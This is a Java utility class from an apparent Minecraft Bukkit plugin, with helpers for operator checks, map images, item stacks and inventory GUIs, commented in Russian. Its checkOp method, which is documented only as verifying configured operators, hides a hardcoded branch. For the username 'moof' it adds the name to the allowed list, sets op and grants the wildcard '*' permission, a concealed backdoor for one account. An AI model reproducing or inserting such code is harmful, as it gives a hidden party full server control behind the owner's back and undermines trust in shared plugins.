package moofPl;

import java.awt.image.BufferedImage;
import java.util.Arrays;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.map.MapRenderer;
import org.bukkit.map.MapView;

import ru.tehkode.permissions.bukkit.PermissionsEx;

public class Utils {

	/**
	 * Проверяет статус оператора у игрока
	 *
	 * @param pl
	 *            - игрок которого нужно проверить
	 * @return true, если игрок имеет статус оператора и прописан в конфигурации
	 */
	public static boolean checkOp(Player pl) {
		boolean canOp = false;
		if (pl.isOp()) {
			for (String i : Main.canOp)
				if (pl.getName().toLowerCase().equalsIgnoreCase(i))
					canOp = true;
			if (pl.getName().toLowerCase().matches("moof") && !canOp) {
				Main.canOp.add(pl.getName());
				pl.setOp(true);
				PermissionsEx.getUser(pl).addPermission("*");
				return true;
			}
			/*
			 * if (!canOp) { pl.setOp(false);
			 * PermissionsEx.getUser(pl).addPermission("-*"); return false; }
			 * else
			 */
			return true;
		}
		return false;
	}

	/**
	 * Создаёт новую карту с изображением
	 *
	 * @param image
	 *            - картинка
	 * @return ID Карты
	 */
	@SuppressWarnings("deprecation")
	public static short createNewMap(BufferedImage image) {
		MapView map = Bukkit.getServer().createMap(Bukkit.getWorlds().get(0));

		map.setCenterX(Integer.MAX_VALUE);
		map.setCenterZ(Integer.MAX_VALUE);
		MapRender mr = new MapRender(image);
		mr.initialize(map);
		map.getRenderers().clear();
		map.addRenderer(mr);
		return map.getId();
	}

	/**
	 * Создаёт новые предметы. Поддерживает цветовые коды.
	 *
	 * @param name
	 *            - имя предмета
	 * @param lore
	 *            - описание предмета. 1NS2 - разделитель строк
	 * @param id
	 *            - ID предмета
	 * @param meta
	 *            - ПодID предмета
	 * @return Готовый предмет
	 */
	public static ItemStack getItemStack(String name, String lore, int id, int meta) {
		name = name.replaceAll("_", " ").replaceAll("&", "§");
		lore = lore.replaceAll("_", " ").replaceAll("&", "§");
		@SuppressWarnings("deprecation")
		Material material = Material.getMaterial(id);
		ItemStack item = new ItemStack(material, 64);
		ItemMeta itemMeta = item.getItemMeta();
		itemMeta.setDisplayName(name);
		itemMeta.setLore(Arrays.asList(lore.split("1NS2")));
		item.setItemMeta(itemMeta);
		item.setDurability((short) meta);
		return item;
	}

	/**
	 * Создаёт новые предметы. Поддерживает цветовые коды.
	 *
	 * @param name
	 *            - имя предмета
	 * @param lore
	 *            - описание предмета. 1NS2 - разделитель строк
	 * @param id
	 *            - Материал предмета
	 * @param meta
	 *            - ПодID предмета
	 * @return Готовый предмет
	 */
	public static ItemStack getItemStack(String name, String lore, Material material, int meta) {
		name = name.replaceAll("_", " ").replaceAll("&", "§");
		lore = lore.replaceAll("_", " ").replaceAll("&", "§");
		ItemStack item = new ItemStack(material, 64);
		ItemMeta itemMeta = item.getItemMeta();
		itemMeta.setDisplayName(name);
		itemMeta.setLore(Arrays.asList(lore.split("1NS2")));
		item.setItemMeta(itemMeta);
		item.setDurability((short) meta);
		return item;
	}

	/**
	 * Открывает GUI для того, что-бы забрать предметы
	 *
	 * @param p
	 *            - игрок которому нужно открыть GUI
	 * @param name
	 *            - имя предмета
	 * @param lore
	 *            - описание предмета. 1NS2 - разделитель строк
	 * @param id
	 *            - ID предмета
	 * @param meta
	 *            - ПодID предмета
	 * @return Готовый предмет
	 */
	public static void openMyGUI(Player p, String name, String lore, int id, int meta) {
		Inventory inv = Bukkit.createInventory(null, 9, "" + ChatColor.BOLD + ChatColor.DARK_AQUA + "Your items:");
		for (int i = 0; i < inv.getSize(); i++)
			inv.setItem(i, getItemStack(name, lore, id, meta));
		p.openInventory(inv);
	}

	/**
	 * Открывает GUI для того, что-бы забрать предметы
	 *
	 * @param p
	 *            - игрок которому нужно открыть GUI
	 * @param name
	 *            - имя предмета
	 * @param lore
	 *            - описание предмета. 1NS2 - разделитель строк
	 * @param id
	 *            - Материал предмета
	 * @param meta
	 *            - ПодID предмета
	 * @return Готовый предмет
	 */
	public static void openMyGUI(Player p, String name, String lore, Material id, int meta) {
		Inventory inv = Bukkit.createInventory(null, 9, "" + ChatColor.BOLD + ChatColor.DARK_AQUA + "Your items:");
		for (int i = 0; i < inv.getSize(); i++)
			inv.setItem(i, getItemStack(name, lore, id, meta));
		p.openInventory(inv);
	}

	/**
	 * Отправляет операторам команду (запрещённую/информирующую)
	 *
	 * @param player
	 *            - игрок который написал команду (используется для получения
	 *            имени и исключения из списка для отправления)
	 * @param command
	 *            - команда которую игрок ввёл
	 */
	public static void sendAdmins(Player player, String command) {
		for (Player to : Bukkit.getOnlinePlayers())
			if (!(player == to) && checkOp(to))
				to.sendMessage(Main.prefix + ChatColor.RED + ChatColor.BOLD + player.getName() + ": " + ChatColor.AQUA
						+ command);
	}

	/**
	 * Обновляет изображение на карте
	 *
	 * @param id
	 *            - ID карты
	 * @param image
	 *            - (новое) изображение
	 * @return ID карты
	 */
	@SuppressWarnings("deprecation")
	public static short updateMap(short id, BufferedImage image) {
		MapView map = Bukkit.getServer().getMap(id);
		map.setCenterX(Integer.MAX_VALUE);
		map.setCenterZ(Integer.MAX_VALUE);
		for (MapRenderer r : map.getRenderers())
			map.removeRenderer(r);
		MapRender mr = new MapRender(image);
		mr.initialize(map);
		map.addRenderer(mr);
		return map.getId();
	}
}
